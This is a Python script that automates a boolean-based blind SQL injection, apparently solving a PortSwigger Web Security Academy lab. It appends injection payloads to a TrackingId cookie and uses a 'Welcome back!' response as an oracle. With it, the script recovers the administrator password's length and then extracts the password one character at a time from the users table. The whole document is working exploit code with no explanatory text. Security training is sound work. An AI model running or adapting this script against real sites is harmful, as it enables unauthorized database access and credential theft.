import requests

url = 'https://0a4700cd0444441280d935bc00e80052.web-security-academy.net/filter?category=Pets'
characters = 'abcdefghijklmnopqrstuvwxyz0123456789'

def get_length():
    for i in range(1, 101):
        cookie = {
            'TrackingId': 'Qll5NhKx5i61GmL9',
            'session': 'MSk0f6Ri329Ntow2Mzz2xItQdXmnUHl1'
        }
        payload = f"' AND LENGTH((SELECT password FROM users WHERE username='administrator')) = {i}--"
        cookie['TrackingId'] = cookie['TrackingId'] + payload  # Use '=' instead of '+=' to avoid accumulating payloads
        r = requests.get(url, cookies=cookie)
        if 'Welcome back!' in r.text:
            return i  

def get_data(length):
    temp = ""    
    for i in range(1, length + 1):
        for char in characters:
            cookie = {
                'TrackingId': 'Qll5NhKx5i61GmL9',
                'session': 'MSk0f6Ri329Ntow2Mzz2xItQdXmnUHl1'
            }
            payload = f"' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'), {i}, 1) = '{char}'--"
            cookie['TrackingId'] = cookie['TrackingId'] + payload  # Use '=' instead of '+=' to avoid accumulating payloads
            r = requests.get(url, cookies=cookie)
            if 'Welcome back!' in r.text:
                temp += char
                print(f'\rPassword so far: {temp}', end='')
                break
    return temp

length = get_length()
print(f"Password length: {length}")
print("Dumping the data, please wait...")
data = get_data(length)
print(f"\nExtracted password: {data}")
